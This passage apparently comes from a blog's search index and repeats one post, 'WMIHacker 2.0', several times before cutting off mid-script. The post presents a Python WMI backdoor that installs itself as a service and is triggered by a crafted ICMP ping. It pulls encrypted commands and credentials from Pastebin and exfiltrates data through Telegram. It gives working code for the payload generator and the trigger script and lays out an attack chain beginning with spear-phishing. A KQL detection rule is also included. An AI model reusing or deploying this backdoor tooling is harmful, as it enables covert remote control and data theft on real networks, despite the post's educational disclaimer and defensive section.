indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This 